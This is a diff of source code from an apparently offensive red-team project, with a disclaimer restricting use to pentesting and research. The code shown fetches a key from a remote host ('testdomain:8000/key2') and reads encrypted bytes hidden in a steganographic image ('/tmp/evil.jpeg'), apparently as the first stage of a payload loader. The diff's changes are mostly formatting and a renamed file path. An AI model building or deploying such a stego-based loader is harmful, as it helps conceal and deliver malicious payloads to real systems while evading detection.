@@ -1,6 +1,5 @@
 //Written by AsaurusRex, DO NOT use this project for purposes other than legitimate red teaming/pentesting jobs, or research.  DO NOT use this for illegal activity of any kind, and know that this project is intended for research purposes and to help advance the missions of both red and blue teams.
 
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -245,7 +244,9 @@ int main()
 {
 sleep(2); //added delay because it seems to produce more reliable execution
 //key here:
-NSString *stringURL = [NSString stringWithFormat:@"http://testdomain:8000/key2"];NSURL *url = [NSURL URLWithString:stringURL];
+NSString *stringURL = [NSString stringWithFormat:@"http://testdomain:8000/key2"];
+
+NSURL *url = [NSURL URLWithString:stringURL];
 //the error resides in the line below
 
 NSData *urlData = [NSData dataWithContentsOfURL:url];
@@ -264,6 +265,7 @@ if ( !urlData )
 }
 
 printf("Successfully fetched key!\n");
+
 int size_key = urlData.length;
 //printf("%d is the size of the key!\n", size_key);
 
@@ -271,7 +273,7 @@ unsigned char* key = (unsigned char*)[urlData bytes];
 
 
 //stego file location:
-NSString *file = [NSString stringWithFormat:@"/tmp/compile_test.jpg"];
+NSString *file = [NSString stringWithFormat:@"/tmp/evil.jpeg"];
 NSData* data0 = [NSData dataWithContentsOfFile:file options:NSDataReadingUncached error:NULL];
 
 unsigned const char* buffer = (unsigned const char*)[data0 bytes];
@@ -293,7 +295,7 @@ for (j; j < trail_byte_offset+1; j++)
 {
     
     encrypted_bytes[count] = buffer[j];
-    ////printf("%02X", buffer[j]);
+    //printf("%02X", buffer[j]);
     count = count + 1; //use count to increase index for encrypted_bytes
 }
 
